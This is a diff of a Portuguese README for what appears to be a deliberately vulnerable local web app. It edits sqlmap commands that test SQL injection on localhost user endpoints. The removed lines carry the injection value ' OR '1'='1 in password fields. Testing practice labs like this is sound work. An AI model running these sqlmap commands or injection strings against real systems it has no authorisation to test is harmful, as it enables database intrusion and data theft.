@@ -39,7 +39,7 @@ Para rodar a aplicação, você pode usar o Docker com o `docker-compose`.
 Execute o seguinte comando para testar a vulnerabilidade de SQL Injection no endpoint que recupera um usuário pelo ID:
 
  ```bash
-    python3 sqlmap.py -u "http://localhost:5000/user?id=1" --batch --dbs --risk=3 --level=5
+    python3 sqlmap.py -u "http://localhost:5000/user?id=1" --batch --ignore-code 404 --dbs --risk=3 --level=5
  ```
 
 Explicação:
@@ -73,7 +73,7 @@ Este comando irá testar se é possível realizar um login bypass usando SQL Inj
 Execute o seguinte comando para testar a vulnerabilidade de SQL Injection no endpoint que cria um novo usuário:
 
  ```bash
-python3 sqlmap.py -u "http://localhost:5000/create_user" --batch --data "name=Test&email=test@example.com&password=' OR '1'='1" --risk=3 --level=5
+python3 sqlmap.py -u "http://localhost:5000/create_user" --batch --data "name=Test&email=test@example.com&password=password123" --risk=3 --level=5
  ```
 
 Explicação:
@@ -90,7 +90,7 @@ Este teste verifica se é possível criar um novo usuário através de uma inje�
 Execute o seguinte comando para testar a vulnerabilidade de SQL Injection no endpoint que edita um usuário existente:
 
  ```bash
-python3 sqlmap.py -u "http://localhost:5000/edit_user?id=1" --batch --data "name=UpdatedName&email=updated@example.com&password=' OR '1'='1" --risk=3 --level=5
+python3 sqlmap.py -u "http://localhost:5000/edit_user?id=1" --batch --method=PUT --data "name=UpdatedName&email=updated@example.com&password=password123" --risk=3 --level=5
  ```
 
 Explicação:
@@ -107,7 +107,7 @@ Este teste irá verificar se é possível alterar os dados de um usuário existe
 Execute o seguinte comando para testar a vulnerabilidade de SQL Injection no endpoint que deleta um usuário:
  
  ```bash
-python3 sqlmap.py -u "http://localhost:5000/delete_user?id=1" --batch --risk=3 --level=5
+python3 sqlmap.py -u "http://localhost:5000/delete_user?id=1" --batch --method=DELETE --risk=3 --level=5
  ```
 
 Explicação:
